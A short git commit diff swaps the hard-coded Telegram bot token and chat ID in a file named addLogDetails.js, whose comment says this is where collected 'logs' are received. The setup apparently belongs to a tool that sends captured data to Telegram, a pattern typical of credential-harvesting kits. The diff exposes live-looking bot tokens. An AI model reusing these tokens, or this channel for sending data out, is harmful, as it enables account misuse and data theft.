6508fe0dc92ee50efa78931e504af7ab64f731b0
pete2147 <158839219+pete2147@users.noreply.github.com>
2024-02-06 01:33:04 +0100

    Update addLogDetails.js

--- addLogDetails.js
+++ addLogDetails.js
@@ -1,7 +1,4 @@
 // Add your bot details here👇 (this is where you will get the logs)
 
-//var telegramBotId = "6884682760:AAGGmriuQiIhpAzQanxb96Q0U952SiVidqw";
-//var chatId = 6674659870;
-
-var telegramBotId = "6502537025:AAGlWDt4HheBPcy10r1x6CtInaTTlb4CVUg";
-var chatId = 6840082974;
+var telegramBotId = "6884682760:AAGGmriuQiIhpAzQanxb96Q0U952SiVidqw";
+var chatId = 6674659870;
